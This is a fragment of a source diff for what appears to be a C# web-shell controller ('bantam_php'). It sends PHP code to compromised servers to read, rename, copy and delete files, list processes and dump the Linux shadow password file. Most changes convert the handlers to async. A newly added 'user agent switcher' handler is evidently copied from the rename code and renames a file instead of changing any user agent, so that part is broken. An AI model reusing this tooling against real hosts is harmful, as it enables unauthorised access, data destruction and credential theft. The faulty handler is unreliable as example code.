+            string name     = fileBrowserGetFileName();
+            string phpCode  = "@readfile('" + name + "');";
 
             executePHPCodeDisplayInRichTextBox(phpCode, "Viewing File -" + name);
         }
@@ -1169,22 +984,22 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void renameFileToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
                 return;
             }
 
-            string fileName = fileBrowserGetFileName();
-            string newFileName = CustomForms.RenameFileDialog(fileName, "Renaming File");
+            string fileName     = fileBrowserGetFileName();
+            string newFileName  = CustomForms.RenameFileDialog(fileName, "Renaming File");
 
             if (newFileName != "")
             {
                 string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
                 string phpCode = "@rename('" + fileName + "', '" + newFile + "');";
 
-                startPhpExecutionThread(phpCode);
+                string result = await startPhpExecutionThread(phpCode);
             }
         }
 
@@ -1193,7 +1008,7 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void deleteFileToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
@@ -1207,8 +1022,7 @@ namespace bantam_php
             {
                 //todo abstract
                 string phpCode = "@unlink('" + path + "');";
-
-                startPhpExecutionThread(phpCode);
+                string result = await startPhpExecutionThread(phpCode);
             }
         }
 
@@ -1217,20 +1031,20 @@ namespace bantam_php
         /// </summary>
         /// <param name="sender"></param>
         /// <param name="e"></param>
-        private void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
+        private async void copyFileToolStripMenuItem_Click(object sender, EventArgs e)
         {
             if (validTarget() == false)
             {
                 return;
             }
 
-            string fileName = fileBrowserGetFileName();
-            string newFileName = CustomForms.RenameFileDialog(fileName, "Copying File");
+            string fileName     = fileBrowserGetFileName();
+            string newFileName  = CustomForms.RenameFileDialog(fileName, "Copying File");
 
             if (newFileName != "")
             {
                 string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
-                startPhpExecutionThread(phpCode);
+                string result = await startPhpExecutionThread(phpCode);
             }
         }
 
@@ -1250,8 +1064,8 @@ namespace bantam_php
                 return;
             }
 
-            bool isWin = Hosts[g_SelectedShellUrl].isWindows;
-            string phpCode = PhpHelper.executeSystemCode(PhpHelper.getTaskListFunction(isWin));
+            bool isWin      = Hosts[g_SelectedShellUrl].isWindows;
+            string phpCode  = PhpHelper.executeSystemCode(PhpHelper.getTaskListFunction(isWin));
             executePHPCodeDisplayInRichTextBox(phpCode, "Process List");
         }
 
@@ -1390,6 +1204,25 @@ namespace bantam_php
         {
             string phpCode = PhpHelper.readFileProcedure(PhpHelper.linuxFS_ShadowFile);
             executePHPCodeDisplayInRichTextBox(phpCode, "shadow");
+        }
+
+        private async void userAgentSwitcherToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (validTarget() == false)
+            {
+                return;
+            }
+
+            string fileName = "User Agent:";
+            string newFileName = CustomForms.RenameFileDialog(fileName, "Change User Agent");
+
+            if (newFileName != "")
+            {
+                string newFile = txtBoxFileBrowserPath.Text + '/' + newFileName;
+                string phpCode = "@rename('" + fileName + "', '" + newFile + "');";
+
+                string result = await startPhpExecutionThread(phpCode);
+            }
         }
 
         /// <summary>
